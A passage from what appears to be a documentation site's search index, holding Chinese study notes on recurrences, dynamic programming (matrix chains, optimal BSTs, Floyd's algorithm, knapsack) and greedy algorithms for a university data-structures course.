\u662f\u6574\u6570\u8fd8\u662f\u5c0f\u6570\uff0c\u5373\u4fbf\u5176\u4e0d\u80fd\u591f\u6574\u9664\uff0c\u518d\u591a\u6b21\u7684divide\u4e4b\u540e\uff0c\u6700\u540e\u8981\u5904\u7406\u7684\u4e00\u4e2a\u7ed3\u679c\u4e5f\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684N\uff0c\u5bf9\u4e8e\u5c0f\u89c4\u6a21\u7684\u6570\u636e\uff0c\u6211\u4eec\u4e0d\u4ecb\u610f\u4f7f\u7528\u66b4\u529b\u6cd5\u89e3\u51b3\u3002</p>"},{"location":"ZJU-course/ADS/ADS/#substitution-method","title":"Substitution method","text":"<p>\u5176\u672c\u8d28\u662fguess\u7136\u540e\u5f52\u7eb3\u8bc1\u660e\uff0c\u5f52\u7eb3\u7684\u8bc1\u660e\u65e0\u9700\u4ece0\u5f00\u59cb\uff0c\u53ef\u4ee5\u4ece\u4efb\u610f\u5927\u7684\u5e38\u6570\u5f00\u59cb</p>"},{"location":"ZJU-course/ADS/ADS/#recursion-tree-method","title":"Recursion-tree method","text":"<p>\u4e0a\u4e00\u79cd\u65b9\u6cd5\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u4f55\u83b7\u5f97\u90a3\u79cd\u4f18\u79c0\u7684guess\uff0c\u9012\u63a8\u7684\u8bc1\u660e\u53cd\u800c\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u8be5\u65b9\u6cd5\u5c31\u662f\u4e3a\u4e86\u5e2e\u52a9\u6211\u4eec\u83b7\u5f97good guess\uff0c\u5bf9\u4e8e\u8fd9\u6837\u4e00\u4e2a\u5f0f\u5b50</p> \\[ T\\left (  N\\right ) = 3 \\ T\\left ( N/4 \\right ) + \\Theta\\left ( N^{2} \\right ) \\] <p>\u5bf9\u4e8e\\(\\Theta(N^{2})\\)\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5c06\u5176\u5316\u6210 \\(cN^{2}\\)\u5176\u4e2dc\u662f\u5e38\u6570\uff0c\u6211\u4eec\u5efa\u7acb\u4e00\u9897\u9012\u5f52\u6811\uff0c\u5176\u5b9e\u672c\u8d28\u5c31\u662f\u628a\u8fd9\u4e2a\u516c\u5f0f\u5c55\u5f00\uff0c\u5f97\u51fa\u5c3e\u6570\u662f\u591a\u5c11</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#master-method","title":"Master method","text":"\\[ 8T(N/3) + O(N^{2}logN) \\] <p>\u7528\u6765\u5224\u65adCombine\u548cConquer\u5230\u5e95\u54ea\u4e2a\u5bf9\u4e8e\u590d\u6742\u5ea6\u5360\u4e3b\u5bfc\u4f5c\u7528\uff0c\u5173\u952e\u5728\u4e8e\\(f(N)\\)</p> <p>\u200b\u200b</p> <p>\u5176\u516c\u5f0f\u5316\u5f62\u5f0f\u5982\u4e0a\u56fe\uff0c\u53ef\u89c1\u5176\u5e76\u672a\u8986\u76d6\u6240\u6709\u60c5\u51b5\uff0c\u4f8b\u5982\\(a = b = 2 , f(N) = NlogN\\)\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u4e0d\u6ee1\u8db31\uff0c2\uff0c3\u4e09\u79cd\u60c5\u51b5</p> <p>\u53ef\u4ee5\u901a\u8fc7\u6784\u5efa\u9012\u5f52\u6811\u5bf9\u5176\u8fdb\u884c\u8bc1\u660e</p> <p>\u4e0a\u8ff0\u7ed3\u8bba\u8fd8\u6709\u53e6\u5916\u4e24\u79cd\u5f62\u5f0f</p> <p>\u200b\u200b</p> <p>\u4e0b\u9762\u8fd9\u79cd\u5f62\u5f0f\u662f\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#_3","title":"\u670b\u8f88","text":"<ul> <li>\u5168\u90e8\u5316\u51fa\u6765\u7528\u9ad8\u4e2d\u6570\u5b66\u516c\u5f0f</li> <li> <p>\u4e3b\u5b9a\u7406\u4e0d\u9002\u7528\u7684\u60c5\u5f62</p> </li> <li> <p>\\(T(N) = T(N/3)+T(2N/3)+\\log N\\) \u8f6c\u6362\u6210 \\(2T(N/2)\\)</p> </li> <li>\\(T(n)=2T(\\sqrt n)+\\log n\\)  \u5c06\\(n\\)\u6362\u5143\u6210\\(2^m\\), \u4e0a\u8ff0\u76f4\u63a5\u63a8\u5c31\u884c\u4e86\uff0c\u5982\u679c\u8981\u5e94\u7528\u4e3b\u5b9a\u7406\uff1f</li> <li> <p>\u5206\u6cbb\u7684\u5e94\u7528</p> </li> <li> <p>\u5f52\u5e76\u6392\u5e8f</p> </li> <li>\u5feb\u901f\u5e42</li> <li> <p>\u9009\u62e9\u95ee\u9898</p> <ul> <li>\u4e24\u4e2a\u6392\u597d\u5e8f\u7684\u6570\u5217 \\(a_1 ...a_n\\) \u548c \\(b_1...b_n\\)</li> <li>\u5728 \\(A\\cup B\\) \u4e2d\u627e\u5230\u7b2ck\u4e2a\u5143\u7d20\uff0c\u4f7f\u7528\u4e00\u822c\u7684\u5f52\u5e76\uff0c\u5c31\u662fOn</li> <li>\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u8fd9\u4e2a\u5143\u7d20\u4e00\u5b9a\u5728 a1\u5230ak\u548cb1\u5230bk\u4e2d</li> <li>\u7136\u540e\u6211\u4eec\u8ba1\u7b97\\(a_{k/2}\\)\u548c\\(b_{k/2}\\)\uff0c\u5982\u679c\u540e\u8005\u5927\u4e8e\u524d\u8005\uff0c\u90a3\u4e48\u53ef\u4ee5\u5c06\u533a\u57df\u51cf\u5c11\u4e00\u534a\uff0c\u53ea\u5b58\u5728\u4e8e\\(a_{k/2}...a_k\\) \u548c \\(b_1...b_{k/2}\\)\uff0c\u518d\u8fdb\u884c\u4e00\u5b9a\u7684\u64cd\u4f5c</li> <li>\u8f6c\u6362\u6210Ologn</li> </ul> </li> </ul>"},{"location":"ZJU-course/ADS/ADS/#dynamic-programming","title":"Dynamic programming","text":"<p>DP\u7684\u76ee\u6807\u5728\u4e8e\uff0c\u5bf9\u4e8e\u67d0\u4e2a\u5b50\u95ee\u9898\uff0c\u4ec5\u89e3\u51b3\u4e00\u6b21\uff1b\u5e76\u4e14\u628a\u6570\u636e\u7ed3\u679c\u5b58\u5728\u8868\u4e2d\u3002\u4e5f\u5373\u7528\u7a7a\u95f4\u6362\u65f6\u95f4\u7684\u601d\u60f3\u3002\u6211\u4eec\u7528\u51e0\u4e2a\u4f8b\u5b50\u6765\u8bb2\u89e3DP</p> <ul> <li>\u5206\u6cbb\u4e0d\u6210\u7acb\uff0cdp\u80af\u5b9a\u4e0d\u6210\u7acb</li> <li>dp\u5fc5\u987b\u662f\u5728\u6709\u91cd\u590d\u5b50\u95ee\u9898\u88ab\u91cd\u590d\u8ba1\u7b97\u7684\u60c5\u51b5\u4e0b\uff0c\u5426\u5219\u5c31\u76f4\u63a5\u9012\u5f52\u4e86</li> </ul> <p>ps. \u9012\u5f52\u4e5f\u53ef\u80fd\u662fdp\uff0c\u8bb0\u5fc6\u5316</p>"},{"location":"ZJU-course/ADS/ADS/#fibonacci-numbers","title":"Fibonacci Numbers","text":"\\[ F(N) = F(N-1)+F(N-2) \\] <p>\u6211\u4eec\u719f\u6089\u7684\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff0c\u5176\u9012\u5f52\u65b9\u5f0f\u7684\u89e3\u51b3\u662f\u5f02\u5e38\u6162\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5176\u9012\u5f52\u6811\uff0c\u76f4\u89c2\u611f\u53d7\u5176\u662f\u4e00\u4e2a\u6307\u6570\u7ea7\u522b\u7684\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u53e6\u4e00\u4e2a\u76f4\u89c2\u611f\u53d7\u662f\u5176\u7528\u5230\u4e86\u5f88\u591a\u6b21\u91cd\u590d\u7684\u8fd0\u7b97</p> <p>\u200b\u200b</p> <p>\u5b9e\u9645\u5c06\u9012\u5f52\u7248\u672c\u8f6c\u5316\u6210\u5faa\u73af\u7248\u672c\u5c31\u662f\u6211\u4eec\u7684DP\u601d\u8def\u4e86\uff0c\u6d88\u8017\u4e24\u4e2aint\u7684\u7a7a\u95f4\u6765\u5b58\u50a8\u5143\u7d20\uff0c\u5c31\u53ef\u4ee5\u964d\u4f4e\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(N)\\)</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#matrix-multiplication","title":"Matrix Multiplication","text":"<p>\u77e9\u9635\u7684\u4e58\u6cd5\u6b63\u5982\u6211\u4eec\u5728\u7ebf\u6027\u4ee3\u6570\u8bfe\u4e0a\u5b66\u4e60\u7684\u90a3\u6837\uff0c\u6211\u4eec\u7ed9\u51fa\u51e0\u4e2a\u8fde\u7eed\u7684\u77e9\u9635\u4e58\u6cd5\uff0c\u6211\u4eec\u5982\u4f55\u505a\u4e58\u6cd5\u7684\u6392\u5e8f\uff0c\u4f7f\u5f97\u5176\u671f\u95f4\u8fdb\u884c\u7684\u64cd\u4f5c\u6700\u5c11\u5462</p> <p>\u6211\u4eec\u8bbe \\(b_{n}\\) \u662f\u4e0d\u540c\u65b9\u5f0f\u8ba1\u7b97\u7684\u6570\u91cf\uff0c\u56e0\u4e3a\u77e9\u9635\u4e58\u6cd5\u5b58\u5728\u4e00\u5b9a\u9650\u5236\uff0c\u4e0d\u80fd\u968f\u610f\u4ea4\u6362\u987a\u5e8f\uff0c\u56e0\u6b64\\(b_{n}\\)\u672c\u8d28\u662f\u4e00\u4e2a\u52a0\u62ec\u53f7\u95ee\u9898</p> <p>\u9996\u5148\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5b50\u95ee\u9898\\(M_{ij}\\)\u662f\u6307\u8ba1\u7b97\u7b2ci\u4e2a\u5230\u7b2cj\u4e2a\u77e9\u9635\u7684\u79ef\u7684\u95ee\u9898\uff0c\u56e0\u6b64\u6211\u4eec\u7684\u95ee\u9898\u8f6c\u5316\u6210\u4e86\\(M_{1n} = M_{1i}*M_{in}\\)\u7684\u95ee\u9898\uff0c\u6839\u636e\u8fd9\u4e2a\u516c\u5f0f\u52a0\u4e0a\\(i\\)\u7684\u9009\u62e9\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u5f97\u51fa\u4ee5\u4e0b\u516c\u5f0f</p> \\[ b_{n} = \\sum_{i=1}^{n-1} b_{i}b_{n-i} \\ , \\ \\ \\  b_{n} = O(\\frac{4^{n}}{n\\sqrt{n}}) \\] <p>\\(b_{n}\\)\u7684\u6570\u91cf\u7ea7\u4ee3\u8868\u7740\u8fd9\u7a77\u4e3e\uff0c\u7eaf\u9012\u5f52\uff0c\u8be5\u7b97\u6cd5\u6240\u9700\u8981\u7684\u57fa\u672c\u6570\u91cf\u7ea7\uff0c\u663e\u7136\u662f\u6307\u6570\u7ea7\u522b\u7684</p> <p>\u5982\u679c\u6211\u4eec\u9700\u8981\u505an\u4e2a\u77e9\u9635\u7684\u4e58\u6cd5\\(M_{1}* ...\\ *M_{n}\\)\uff0c\u6839\u636e\u7ebf\u6027\u4ee3\u6570\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u80fd\u591f\u63a8\u51fa\u5176\u4e2d\u7684\u4e00\u4e2a\\(M_{i}\\)\u662f\u4e00\u4e2a\\(r_{i-1} * r_{i}\\)\u7684\u77e9\u9635\uff0c\u6211\u4eec\u5047\u8bbe\\(m_{ij}\\)\u662f\u8ba1\u7b97\u7b2ci\u4e2a\u5230\u7b2cj\u4e2a\u77e9\u9635\u7684\u6700\u4f18\u89e3\uff0c\u5176\u6709\u4ee5\u4e0b\u9012\u63a8\u516c\u5f0f</p> \\[ \\begin{equation} m_{ij} = \\left\\{\\begin{aligned}  0 &amp;&amp; if \\ i=j\\\\  \\min_{i\\leqslant  l &lt; j}\\{m_{il}+m_{l+1j}+r_{i-1}r_{l}r_{j}  \\} &amp;&amp; if\\ j&gt;i  \\end{aligned}\\right. \\end{equation} \\] <p>\u200b\u200b</p> <p>\u4e0a\u9762\u662f\u6211\u4eec\u7684\u4ee3\u7801\u5b9e\u73b0\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4TwoDimArray M \u6765\u5b58\u50a8\u5f53\u524d\u904d\u5386\u5230\u7684\u5bf9\u5e94\u7684\u6700\u4f18\u89e3 \\(m_{ij}\\) \u6700\u7ec8\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(N^{3})\\) </p>"},{"location":"ZJU-course/ADS/ADS/#optimal-binary-search-tree","title":"optimal binary search tree","text":"<p>\u6784\u5efa\u4e00\u9897\u5e73\u8861\u7684\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u7ed9\u51faN\u4e2awords\uff0c\u5b83\u4eec\u4e4b\u95f4\u5b58\u5728\u987a\u5e8f\uff0c\u4f46\u540c\u65f6\u5b83\u4eec\u4e4b\u95f4\u8fd8\u5b58\u5728\u8bbf\u95ee\u9891\u7387\u4e0a\u7684\u5dee\u8ddd\uff0c\u7528\\(p_{i}\\)\u6765\u8868\u793a\u8bbf\u95ee\u9891\u7387</p> <p>\u6211\u4eec\u53ef\u4ee5\u7ed9\u51fa\u4e00\u4e2a\u6548\u7387\u7684\u8868\u8fbe\u5f0f\uff0c\u5176\u4e2d\\(d_{i}\\)\u8868\u793a\u5176\u6240\u5728\u7684\u6df1\u5ea6</p> \\[ T(N) = \\sum_{i=1}^{N}p_{i}*(1+d_{i}) \\] <p>\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u60f3\u6cd5\uff0c\u6211\u4eec\u6309\u7167\u51fa\u73b0\u9891\u7387\u7684\u9006\u5e8f\u53bb\u63d2\u5165\u5143\u7d20\uff0c\u51fa\u73b0\u9891\u7387\u9ad8\u7684\u5143\u7d20\u4e00\u822c\u4f1a\u5728\u9760\u8fd1root\u7684\u5730\u65b9\uff0c\u8fd9\u65f6\u5bf9\u4e8e\u666e\u901a\u6811\u548cAVL\u6811\u4f1a\u6709\u4e24\u4e2a\u4e0d\u540c\u7684\u7ed3\u679c</p> <p>\u200b\u200b</p> <p>So\uff0c\u8fd8\u662f\u8001\u6837\u5b50\uff0c\u6211\u4eec\u8981\u627e\u51fa\u6211\u4eec\u8fd9\u4e2a\u95ee\u9898\u7684\u5b50\u95ee\u9898\u6765\u89e3\u51b3\u3002\u6211\u4eec\u5047\u8bbe\\(T_{ij}\\)\u662f\u6784\u5efa\u8bcd\u8bed\u96c6\u5408\u7684\u4e00\u4e2a\u5b50\u96c6\\(w_{i} ... w_{j}\\)\u7684\u6700\u4f18\u641c\u7d22\u6811\uff0c\\(c_{ij}\\)\u662f\u82b1\u8d39\u7684cost\uff0c\\(r_{ij}\\)\u662froot\uff0c\\(w_{ij}\\)\u662f\\(T_{ij}\\)\u7684weight\uff0c\u4e5f\u5373\u8fd9\u91cc\u9762\u6240\u6709word\u7684\u9891\u7387\u7684\u548c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u5efa\u51fa\u4e00\u9897\u6811\uff0c\u6211\u4eec\u9009\u62e9k\u4f5c\u4e3aroot</p> <p>\u200b\u200b</p> \\[ c_{ij} = p_{k} +cost(L) +weight(L)+cost(R)+weight(R) \\] <p>\u52a0\u4e0aweight\u7684\u539f\u56e0\u662fL\u548cR\u52a0\u5230\\(w_{k}\\)\u4e0b\u65f6\u6240\u6709\u5143\u7d20\u7684\u6df1\u5ea6\u90fd\u52a0\u4e00\u4e86\uff0c\u56e0\u6b64\u76f8\u5f53\u4e8e\\(1*weight(L)\\) \u4e0a\u5f0f\u6362\u4e2a\u8868\u8ff0\u5c31\u662f</p> \\[ c_{ij} = w_{ij} + c_{i,k-1}+c_{k+1,j} \\] <p>\u5b9e\u9645\u4e0a\u5c31\u662f\\(c_{ij} = min\\{w_{ij} + c_{i,k-1}+c_{k+1,j}\\}\\)\uff0c\u4ece\u4ee5\u4e0a\u516c\u5f0f\uff0c\u6211\u4eec\u5f97\u4ee5\u4e00\u6b65\u6b65\u63a8\u5bfc\u6574\u4e2a\u8fc7\u7a0b</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u5269\u4e0b\u7684\u5de5\u4f5c\u5c31\u662f\u628a\u8fd9\u9897\u6811\u91cd\u6784\u51fa\u6765\uff0c\u4ee5\u4e0a\u56fe\u4e3a\u4f8b\uff0c\u6211\u4eec\u627e\u5230\u4e86char\u4f5c\u4e3a\u6839\u8282\u70b9\uff0c\u5de6\u5b50\u6811\u5e94\u8be5\u662fbreak-case\u53f3\u5b50\u6811\u5e94\u8be5\u662fdo-void\uff0c\u5206\u522b\u5728\u4e0a\u56fe\u628a\u8fd9\u4e24\u9897\u5b50\u6811\u7684\u6839\u627e\u51fa\u6765\u3002\u4ee5\u6b64\u9012\u5f52\uff0c\u627e\u5230\u6839\u8282\u70b9\uff0c\u627e\u5b50\u6811\u3002</p> <p>\u6700\u7ec8\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(T(N) = O(N^{3})\\)\u4f46\u662f\u5b9e\u9645\u4e0a\u6709\u65b9\u6cd5\u53ef\u4ee5\u5316\u62102\u6b21\u65b9</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#all-pairs-shortest-path","title":"All-Pairs Shortest Path","text":"<p>\u5bf9\u4e8e\u56fe\u4e2d\u7684\u6bcf\u4e00\u5bf9\u70b9\\(v_{i}\\)\u548c\\(v_{j}\\)\uff0c\u627e\u5230\u5b83\u4eec\u4e4b\u95f4\u7684\u6700\u77ed\u8def</p> <p>\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u5bf9\u6bcf\u7ec4\\(v_{i}\\)\u548c\\(v_{j}\\)\u90fd\u505a\u4e00\u6b21Dijkstra\uff0c\u4f46\u663e\u7136\u5176\u4e2d\u505a\u4e86\u91cd\u590d\u7684\u8ba1\u7b97\uff0c\u56e0\u6b64\u6211\u4eec\u6709\u5b9a\u4e49</p> \\[ D^{k}[i][j]=\\min\\{length\\ of\\ path\\ i\\rightarrow \\{l\\leq k\\}\\rightarrow j \\} \\] <p>\u7279\u522b\u5730\u5f53k\u7b49\u4e8e-1\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5b9a\u4e49\u4e3ai, j\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u663e\u7136\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u7684\u5c31\u662f\\(D^{N-1}[i][j]\\)</p> <p>\u4e8e\u662f\u6211\u4eec\u9009\u62e9\u4ece\\(D^{-1}\\)\u5f00\u59cb\uff0c\u4e00\u6b65\u6b65\u751f\u6210\u5e76\u5b58\u50a8\\(D^{0},D^{1}...D^{N-1}\\)\uff0c\u6bcf\u6b21\u90fd\u6709\u4ee5\u4e0b\u4e24\u79cd\u53ef\u80fd\uff0c\u5e76\u4e14\u6211\u4eec\u4fdd\u8bc1\u9700\u8981\u4f7f\u7528\u5230\u7684\\(D^{k-1}[i][k],D^{k-1}[k][j]\\)\u90fd\u662f\u5df2\u7ecf\u751f\u6210\u4e14\u5b58\u50a8\u597d\u7684</p> <p>\u200b\u200b</p> <p>\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b\uff0c\u9700\u8981\u81ea\u884c\u67e5\u770b\u4e66\uff0c\u5b66\u4e60\u5982\u4f55\u5b58\u50a8\u8def\u5f84\uff0c\u4e3a\u4ec0\u4e48\u65f6\u95f4\u590d\u6742\u5ea6\u76f8\u540c\uff0c\u5b83\u5728dense graph\uff08\u7a20\u5bc6\u56fe\uff09\u6bd4\u5168\u7528Dijkstra\u8981\u5feb*</p> <pre><code>if dist[i][j] &gt; dist[i][k] + dist[k][j]:\n    dist[i][j] = dist[i][k] + dist[k][j]\n    next[i][j] = next[i][k]\n</code></pre> <p>\u5b58\u50a8\u8def\u5f84\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u77e9\u9635\uff0c\u77e9\u9635\u4e2d\u5143\u7d20m[i][j]\u6709\u4e24\u79cd\u53ef\u80fd</p> <ul> <li>i\u5230j\u6ca1\u6709\u8def\u5f84 -1</li> <li>i\u5230j\u6709\u8def\u5f84\uff0c\u90a3\u4e48\u8bb0\u5f55\u8fd9\u6761\u8def\u5f84\u4e2di\u7684\u540e\u7ee7</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ADS/#product-assembly","title":"Product Assembly","text":"<p>\u6211\u4eec\u6709\u4e24\u6761\u8def\u628a\u4e1c\u897f\u8fd0\u8f93\u5230\u6307\u5b9a\u5730\u65b9\uff0c\u6bcf\u6761\u8def\u4e0a\u6709\u51e0\u4e2a\u56fa\u5b9a\u7684stage\uff0cstage\u5230stage\u4e4b\u95f4\u6709\u82b1\u8d39\uff0c\u540c\u65f6\uff0c\u4e24\u6761\u8def\u7684stage\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u8df3\u8f6c</p> <p>\u200b\u200b</p> <p>\u9700\u8981\u6c42\u51fa\u6700\u5c0f\u6d88\u8017</p> <p>\u5982\u679c\u6211\u4eec\u7a77\u4e3e\u7684\u8bdd\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(2^{n})\\)\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a\\(O(N)\\)\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u628a\u6240\u6709\u7684\u53ef\u884c\u89e3\u90fd\u6c42\u51fa\u6765</p> <p>\u6211\u4eec\u5f88\u5bb9\u6613\u80fd\u591f\u77e5\u9053\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6700\u4f18\u89e3\u6765\u8bf4\uff0c\u5176\u8d77\u70b9\u5230\u5176\u4e2d\u4efb\u610f\u4e00\u4e2astage\u7684\u8def\u7ebf\u90fd\u662f\u6700\u4f18\u89e3\uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ea\u9700\u7ef4\u62a4\u8d77\u70b9\u5230\u6bcf\u4e2a\u70b9\u6700\u4f18\u89e3\u5373\u53ef\uff08\u4e00\u4e2a\u6700\u4f18\u89e3\u5305\u542b\u7740\u4e00\u4e2a\u5b50\u95ee\u9898\u7684\u6700\u4f18\u89e3</p> <p>\u5bf9\u4e8e\u6bcf\u4e2astage\u7684\u6700\u4f18\u89e3\uff0c\u6211\u4eec\u53ea\u9700\u77e5\u9053\u5176\u4e24\u9762\u4e24\u4e2astage\u7684\u6700\u4f18\u89e3\u5373\u53ef</p> <p>\u200b\u200b</p> <p>\u4f46\u662f\u4e0a\u8ff0\u53ea\u662f\u627e\u5230\u4e86\u6700\u77ed\u8def\u5f84\u7684\u6570\u503c\uff0c\u672a\u5b9e\u9645\u7ed9\u51fa\u6700\u77ed\u8def\uff0c\u56e0\u6b64\u6211\u4eec\u6700\u597d\u518d\u5b9e\u9645\u7ef4\u62a4\u4e24\u6761\u5e8f\u5217\uff0c\u8bb0\u5f55\u5404\u81ea\u7684\u6700\u4f18\u89e3\u7684\u4e0a\u4e00\u7ea7\u662f\u4ece\u54ea\u91cc\u6765\u7684</p>"},{"location":"ZJU-course/ADS/ADS/#dp-summary","title":"DP summary","text":"<p>\u603b\u7ed3\u4e00\u4e0bDP\u7684\u7b56\u7565</p> <ul> <li>\u63cf\u8ff0\u4e00\u4e0b\u6700\u4f18\u7b56\u7565</li> <li>\u9012\u5f52\u7684\u5b9a\u4e49\u6700\u4f18\u60c5\u51b5</li> <li>\u5c06\u4e00\u7cfb\u5217\u7684\u60c5\u51b5\uff0c\u6309\u7167\u67d0\u79cd\u987a\u5e8f\u8ba1\u7b97\u5e76\u4e14\u5b58\u50a8\u4e0b\u6765</li> <li>\u91cd\u6784\u6574\u4e2a\u89e3\u51b3\u7b56\u7565</li> </ul>"},{"location":"ZJU-course/ADS/ADS/#dp","title":"DP \u670b\u8f88","text":"<p>\u56de\u6eaf\uff0cDP\uff0c\u5206\u6cbb\u7b49\u7b49\u8bbe\u8ba1\u7b97\u6cd5\u7684\u601d\u8def</p> <p>\u95ee\u9898\uff1a\u8f93\u5165 \u548c \u6620\u5c04\u5173\u7cfb</p> <p>\u80cc\u5305\u95ee\u9898</p> <p>\u80cc\u5305\u95ee\u9898\u7684\u66b4\u529b\uff08\u6bcf\u4e2a\u7269\u4ef6\u90fd\u6709\u8981\u548c\u4e0d\u8981\u4e24\u79cd\u53ef\u80fd\\(2^{n}\\)\uff09</p> <p>\u80cc\u5305\u95ee\u9898\u7684\u56de\u6eaf\uff08\u5f53\u91cd\u91cf\u8d85\u4e86\u4e4b\u540e\u5c31\u526a\u679d\uff09</p> <p>\u80cc\u5305\u95ee\u9898\u7684DP\uff08\u57fa\u4e8e\u73b0\u6709\u89e3\u6765\u505a\u89c4\u5212\uff0c\u65e0\u9700\u91cd\u590d\u8ba1\u7b97\uff09</p> <p>\u6211\u4eec\u67091-n\u4e2a\u7269\u4ef6\uff0cc\u7684\u5bb9\u91cf\uff0c\u5bf9\u4e8ec\u548ci\uff08\u7b2ci\u4e2a\u7269\u54c1\uff09\u8fdb\u884c\u89c4\u5212</p> \\[ \\begin{equation} p_{i}(c) = \\left\\{\\begin{aligned}  p_{i-1}(c) &amp;&amp; if \\ w_{i}&gt;c\\\\  \\max\\{p_{i-1}(c)+p_{i-1}(c-w_{i}) + p_{i} \\} &amp;&amp; if\\ w_{i}&lt;=c  \\end{aligned}\\right. \\end{equation} \\] <p>\u4ece\u9012\u5f52\u83b7\u53d6\u524d\u7f6e\u6570\u636e\u8f6c\u6362\u5230\u6570\u7ec4\u83b7\u53d6\u524d\u7f6e\u6570\u636e\u4e2d</p> <p>2020 final</p> <p>\u7ed9\u51fa\u4e24\u4e2a\u6709\u987a\u5e8f\u7684\u5e8f\u5217\uff0c\u6211\u4eec\u5220\u9664\u6389\u4e24\u4e2a\u5e8f\u5217\u91cc\u9762\u7684\u4e00\u90e8\u5206\u4e1c\u897f\uff0c\u5269\u4e0b\u7684\u4e1c\u897f\u6309\u539f\u6709\u987a\u5e8f\u76f8\u4e58\uff0c\u5f97\u51fa\u7ed3\u679c\u6700\u9ad8</p> <p>\u6211\u4eec\u7684\u76ee\u6807\u662fA(m, n)\uff0c\u5199\u51fa\u72b6\u6001\u8f6c\u79fb\u65b9\u7a0b A(i, j) -&gt; A(i, j+1) \u6216\u8005 A(i+1, j) \u6211\u4eec\u51b3\u5b9ai+1\u548cj+1\u662f\u5426\u9700\u8981\u629b\u5f03\uff0c\u901a\u8fc7\u4e0b\u9762\u5f0f\u5b50\u53ef\u4ee5\u53d1\u73b0\u6bcf\u6b21\u72b6\u6001\u8f6c\u79fb\u8981\u82b1\u8d39i\u4e2a\u65f6\u95f4</p> \\[ A(i,j) = \\max\\{A(i, j-1), \\max_{k}\\{A(k-1, j-1)+x_{k-1}*y_{j}\\} \\} \\] <p>DP\u7684\u590d\u6742\u5ea6\u5206\u6790\u5c31\u662f\u6709\u591a\u5c11\u4e2a\u72b6\u6001\uff08\u683c\u5b50\uff09\u4ee5\u53ca\u6bcf\u6b21\u72b6\u6001\u8f6c\u79fb\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u76f8\u4e58\u5373\u53ef</p> <p>\u4e0a\u8ff0\u9898\u76ee\u5982\u679c\u6709\u4e09\u4e2a\u5e8f\u5217\u76f8\u4e58\uff0c\u72b6\u6001\u6570\u91cf\u5c31\u53d8\u6210\u4e86\\(n^{3}\\) </p>"},{"location":"ZJU-course/ADS/ADS/#greedy","title":"Greedy","text":"<p>\u5728FDS\u8bfe\u7a0b\u4e2d\u6211\u4eec\u5df2\u7ecf\u5b66\u4e60\u4e86\u4e00\u4e9b\u8d2a\u5fc3\u7684\u7b97\u6cd5\uff0c\u4f8b\u5982dijikstra\u548cKruskal, \u5176\u672c\u8d28\u90fd\u662f\u7528\u6765\u89e3\u51b3\u4f18\u5316\u95ee\u9898\uff0c\u4f55\u4e3a\u4f18\u5316\u95ee\u9898\uff1a\u7ed9\u51fa\u4e00\u7cfb\u5217\u7684\u9650\u5236constraints\uff0c\u548c\u4e00\u4e2aoptimization function, \u6ee1\u8db3constraints\u7684\u89e3\u662ffeasible solutions, \u5176\u4e2doptimization function\u80fd\u6709\u6700\u5927\u7684value\u7684\u89e3\u662foptimal solution, \u4e5f\u5c31\u662f\u6700\u4f18\u89e3</p> <p>\u8d2a\u5fc3\u5c31\u662f\u8ffd\u6c42\u5c40\u90e8\u6700\u4f18\u89e3\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u8d2a\u5fc3\u6cd5\u4e5f\u5c31\u662f\u6700\u4f18\u89e3\u3002\u4f46\u8fd9\u5e76\u4e0d\u80fd\u5f97\u5230\u4fdd\u8bc1\uff0c\u5373\u4fbf\u5982\u6b64\uff0c\u8d2a\u5fc3\u5f80\u5f80\u80fd\u591f\u627e\u5230\u4e00\u4e2a\u63a5\u8fd1\u6700\u4f18\u89e3\u7684\u89e3\u51b3\u3002  </p>"},{"location":"ZJU-course/ADS/ADS/#activity-selection","title":"Activity 